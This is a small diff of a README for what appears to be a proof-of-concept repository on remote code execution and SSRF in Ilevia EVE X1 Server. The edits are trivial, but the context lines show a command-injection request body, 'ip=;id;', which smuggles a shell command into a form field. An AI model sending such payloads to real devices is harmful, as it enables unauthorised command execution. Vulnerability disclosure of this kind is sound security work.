@@ -1,5 +1,5 @@
 # ilevia-EVE-X1-Server
-ilevia-EVE-X1-Server rce poc；ssrf
+ilevia-EVE-X1-Server rce poc;ssrf
 
 ## Affected Repository
 - Project: Ilevia EVE X1 Server 
@@ -26,6 +26,7 @@ Content-Length: 6
 ip=;id;
 ```
 <img width="1307" height="359" alt="image" src="https://github.com/user-attachments/assets/be1a6130-9a3f-4655-80be-80a89a3e5128" />
+
 - ssrf
 
 ```
